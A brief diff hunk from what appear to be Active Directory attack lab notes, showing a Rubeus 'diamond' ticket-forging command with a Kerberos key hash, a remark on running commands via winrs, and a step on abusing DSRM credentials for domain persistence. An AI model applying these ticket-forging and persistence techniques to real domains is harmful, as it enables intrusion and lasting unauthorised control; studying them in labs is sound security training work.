@@ -424,4 +424,3 @@ C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f928438
 ```
 and now you can user win-rs to execute commands
 - Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
--
